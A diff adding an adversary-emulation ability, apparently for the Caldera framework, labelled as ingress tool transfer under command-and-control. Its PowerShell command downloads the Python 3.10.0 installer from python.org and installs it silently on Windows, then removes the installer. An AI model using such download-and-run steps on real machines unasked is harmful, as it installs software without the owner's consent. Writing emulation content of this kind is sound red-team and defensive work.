@@ -1,0 +1,25 @@
+---
+
+- id: 4aa55a9e-b37d-4e41-9a4d-f67415d03e34
+  name: Install Python
+  description: Download and install Python
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $wc=New-Object System.Net.WebClient;
+          $output="C:\temp\Python310Installer.exe";
+          $wc.DownloadFile("https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe", $output);
+          C:\temp\Python310Installer.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0;
+          if ($LASTEXITCODE -eq 0) {
+            echo "3.10.0";
+          }
+        cleanup: |
+          rm Python310Installer.exe;
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+            - source: host.install.python
